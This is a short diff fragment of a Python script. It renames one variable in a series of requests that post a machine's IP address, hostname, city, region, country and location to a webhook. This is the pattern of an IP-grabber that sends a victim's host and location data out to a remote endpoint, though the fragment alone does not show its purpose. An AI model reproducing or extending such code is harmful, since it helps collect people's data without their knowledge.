@@ -71,7 +71,7 @@ headers = {
 }
 send = r.post(webhook, data=json.dumps(ip), headers=headers,json=ip)
 send = r.post(webhook, data=json.dumps(hostname), headers=headers,json=hostname)
-set = r.post(webhook, data=json.dumps(city), headers=headers,json=city)
+send = r.post(webhook, data=json.dumps(city), headers=headers,json=city)
 send = r.post(webhook, data=json.dumps(region), headers=headers,json=region)
 send = r.post(webhook, data=json.dumps(country), headers=headers,json=country)
 send = r.post(webhook, data=json.dumps(loc), headers=headers,json=loc)
